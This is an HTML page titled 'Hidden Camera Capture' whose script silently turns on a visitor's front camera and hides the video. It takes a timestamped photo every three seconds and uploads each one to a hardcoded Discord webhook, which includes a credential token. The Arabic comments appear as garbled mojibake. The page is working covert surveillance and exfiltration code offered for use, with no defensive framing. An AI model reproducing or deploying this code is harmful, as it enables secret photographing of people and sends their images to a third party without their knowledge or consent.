<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Hidden Camera Capture</title>
  <style>
    video {
      display: none;
    }
  </style>
</head>
<body>

<video id="video" autoplay playsinline></video>

<script>
const webhookURL = "https://discord.com/api/webhooks/1317625966306005104/Jto4PkzgKwC4GwedEP4PiL4PjXjF2tBcNdSizTBG_7omqqivhu32KOmis0kbtwlwEf2w";
const CAPTURE_INTERVAL = 3000; // 3 Ø«ÙˆØ§Ù†ÙŠ

// ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØºÙŠØ± Ø¸Ø§Ù‡Ø±Ø©)
navigator.mediaDevices.getUserMedia({
  video: {
    width: 1280,
    height: 720,
    facingMode: "user" // ØºÙŠÙ‘Ø±Ù‡Ø§ Ø¥Ù„Ù‰ environment Ù„Ù„Ø®Ù„ÙÙŠØ©
  }
})
.then(stream => {
  const video = document.getElementById("video");
  video.srcObject = stream;
  video.play();

  // Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
  setInterval(() => {
    captureAndSend(video);
  }, CAPTURE_INTERVAL);
})
.catch(err => {
  console.error("Camera error:", err);
});

function captureAndSend(video) {
  if (video.videoWidth === 0) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Ø§Ù„ØªØ§Ø±ÙŠØ® ÙˆØ§Ù„ÙˆÙ‚Øª
  const now = new Date().toLocaleString();

  // Ø´Ø±ÙŠØ· Ø®Ù„ÙÙŠØ©
  ctx.fillStyle = "rgba(0,0,0,0.6)";
  ctx.fillRect(0, canvas.height - 60, canvas.width, 60);

  // Ù†Øµ Ø§Ù„ØªØ§Ø±ÙŠØ®
  ctx.fillStyle = "white";
  ctx.font = "20px Arial";
  ctx.fillText("ðŸ•’ " + now, 20, canvas.height - 25);

  // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");
    formData.append("payload_json", JSON.stringify({
      content: "ðŸ“¸ Capture\nðŸ•’ " + now
    }));

    fetch(webhookURL, {
      method: "POST",
      body: formData
    });
  }, "image/jpeg", 0.95);
}
</script>

</body>
</html>
